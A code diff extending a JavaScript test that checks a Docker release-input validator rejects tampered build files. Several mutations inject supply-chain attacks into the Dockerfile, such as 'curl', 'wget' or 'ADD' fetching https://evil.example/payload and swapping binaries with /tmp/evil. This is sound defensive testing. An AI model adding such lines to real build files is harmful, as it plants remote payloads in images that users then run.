@@ -24,6 +24,19 @@ const mutations=[
  d=>replace(d,'docker/Dockerfile','test -s /usr/share/doc/agent-wechat/licenses/novnc/LICENSE.txt','echo /usr/share/doc/agent-wechat/licenses/novnc/LICENSE.txt'),
  d=>replace(d,'docker/release-materials/requirements.lock','frida-tools==14.10.4','frida-tools'),
  d=>{const p=join(d,'docker/release-materials/frida_tools-14.10.4-py3-none-any.whl');writeFileSync(p,Buffer.concat([readFileSync(p),Buffer.from('drift')]));},
+ d=>replace(d,'docker/Dockerfile','libssl-dev build-essential tcl \\','libssl-dev build-essential tcl telnet \\'),
+ d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN curl https://evil.example/payload -o /tmp/payload\nRUN useradd -m -s /bin/bash wechat'),
+ d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN wget https://evil.example/payload -O /tmp/payload\nRUN useradd -m -s /bin/bash wechat'),
+ d=>replace(d,'docker/Dockerfile','COPY entrypoint.sh /entrypoint.sh','ADD https://evil.example/payload /tmp/payload\nCOPY entrypoint.sh /entrypoint.sh'),
+ d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN cp /tmp/evil /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat'),
+ d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN rm -rf /opt/novnc && cp -r /tmp/evil /opt/novnc\nRUN useradd -m -s /bin/bash wechat'),
+ d=>replace(d,'docker/Dockerfile','ENV DISPLAY=:99','ENV EVIL_URL=https://evil.example/payload\nENV DISPLAY=:99'),
+ d=>replace(d,'docker/release-inputs.json','https://snapshot.ubuntu.com/ubuntu','https://mirror.example/ubuntu'),
+ d=>{replace(d,'docker/release-inputs.json','\"version\": \"1.5.0\"','\"version\": \"1.6.0\"');replace(d,'docker/Dockerfile','ARG NOVNC_VERSION=1.5.0','ARG NOVNC_VERSION=1.6.0');},
+ d=>replace(d,'docker/Dockerfile','ARG WECHAT_VERSION=4.1.1.8','ARG WECHAT_VERSION=4.1.1.9'),
+ d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN cp /tmp/evil /usr/local/bin/sqlcipher && echo cp sqlcipher /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat'),
+ d=>replace(d,'docker/release-inputs.json','\"providedFiles\": [','\"providedFiles\": [\n        \"/tmp/unapproved\",'),
+ d=>replace(d,'docker/release-inputs.json','\"pkg-config\": \"1.8.1-1\"','\"pkg-config\": \"1.8.1-1\", \"curl\": \"any\"'),
 ];
 for(const mutate of mutations){const d=mkdtempSync(join(tmpdir(),'release-inputs-'));try{for(const x of ['docker','.github','scripts'])cpSync(join(root,x),join(d,x),{recursive:true});mutate(d);const result=run(d);assert.notEqual(result.status,0,`mutation escaped validator: ${result.stdout}`);}finally{rmSync(d,{recursive:true,force:true});}}
 // Existing cache must be verified before the downloader can report success.
